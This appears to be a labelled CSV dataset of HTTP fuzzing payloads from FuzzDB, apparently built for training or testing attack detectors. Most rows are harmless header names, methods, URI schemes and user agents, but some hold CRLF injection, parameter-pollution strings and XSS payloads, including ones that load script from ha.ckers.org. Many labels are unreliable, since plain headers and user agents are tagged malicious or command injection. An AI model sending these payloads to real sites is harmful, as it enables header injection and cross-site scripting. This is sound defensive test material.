uuid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
nfs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Type,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ymsgr:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Warning,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
icap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ORDERPATCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%5cr%5cn,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
fax:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Trailer,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mupdate:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0d%0a%0a,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10 (.NET CLR 3.5.30729) JBroFuzz/1.4,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
TRACE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
opaquelocktoken:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
WWW-Authenticate,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mms:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xri:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ssh:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[=1&id=2]=3,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Language,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id;id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&id=1?id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
z39.50r:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dict:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
z39.50s:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=id['1']=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
REPORT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aw:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
svn:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
udp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Set-Cookie,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
feed:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gg:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
LOCK,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-MS-ENUMATTS,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id&id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Disposition,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Encoding,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
0x0D0x0D0x0A0x0A,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=/:@&=+$&id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
afp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Connection,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
view-source:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%26id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
things:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.beep:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mailto:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rtsp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sgn:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
http:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Range,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:0.9.2) Gecko/20010726 Netscape6/6.1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
nntp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
notes:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
TRACK,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
POST,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
https:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
prospero:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
git:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Security-Policy,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BCOPY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
keyparc:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
soap.beep:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
POLL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
file:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Max-Forwards,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
NOTIFY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.79 [en] (WinNT; U),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
secondlife:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sftp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&id=1&id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Range,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
query:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0aX-Injection-Header:%20AttackValue,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Server,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ldaps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0%0d%0ad%0%0d%0aa,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E,SCRIPT_TAG_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E,SCRIPT_TAG_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3Ehttp://www.test.com,SCRIPT_TAG_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0AContent-type:%20text/html%0A%0Ahttp://www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E,SCRIPT_TAG_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a%3Chtml%3E%3Cbody%3E%3C%2Fbody%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fs.js%3E%3C%2Fscript%3E%3Cscript%3Ealert(%22location.host%20is:%20%22%2Blocation.host)%3C%2Fscript%3E%3C%2Fhtml%3E,SCRIPT_TAG_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E,SCRIPT_TAG_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2Fscript%3E,SCRIPT_TAG_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0aX-Injection-Header:%20AttackValue,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0d%0a%0a,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22,SCRIPT_TAG_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%5cr%5cn,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&&&&id=1,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&id=1&id=2,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&id=1;id=2,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&id=1?id=2,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
0x0D0x0A,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
0x0D0x0D0x0A0x0A,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
;id=1?id=2,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
????id=1,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id&=1,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id&id=1,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id;id=1,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=%23?id=1,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=/:@&=+$&id=2,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1#id=2,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%2526id=2,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%26id%3D2,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%26id=2,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%c0%a6id=2,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%u0026;id=2,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1&#38;id=2,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1&amp;id=2,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1&id=2,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1\\uc0a6id=2,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id==1,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id===1,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=id=1,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=id['1']=2,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[&id=2]=1,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id['&id=1']=2,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[1&id=2]=1,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[=/:@&=+$&id=2]=1,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[=1&id=2]=3,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[]=1&id=2,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ACL,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ARBITRARY,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Charset,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Datetime,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Encoding,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Language,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Ranges,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Access-Control-Allow-Origin,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Age,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Allow,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Authorization,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BASELINE-CONTROL,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BCOPY,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BDELETE,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BMOVE,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BPROPFIND,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BPROPPATCH,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
CHECKIN,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
CHECKOUT,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
CONNECT,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Cache-Control,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Connection,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Disposition,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Encoding,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Language,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Length,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Location,COMMAND_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-MD5,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Range,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Security-Policy,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Type,COMMAND_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Cookie,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
DEBUG,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
DNT,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ETag,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Expires,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
From,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Front-End-Https,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
GET,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
INDEX,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Match,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Modified-Since,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-None-Match,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Range,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Unmodified-Since,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
LOCK,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Last-Modified,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKACTIVITY,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKCOL,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKWORKSPACE,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Max-Forwards,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
NOTIFY,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
OPTIONS,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ORDERPATCH,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Origin,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
P3P,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
POLL,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
POST,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PROPFIND,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PROPPATCH,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PUT,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Pragma,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Authenticate,COMMAND_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Authorization,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Connection,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Public-Key-Pins,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
REPORT,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
RPC_IN_DATA,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
RPC_OUT_DATA,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Range,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Referer,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Refresh,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Retry-After,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
SEARCH,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
SUBSCRIBE,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Server,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Set-Cookie,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Status,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Strict-Transport-Security,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
TRACE,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
TRACK,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Trailer,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Transfer-Encoding,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNCHECKOUT,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNLOCK,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
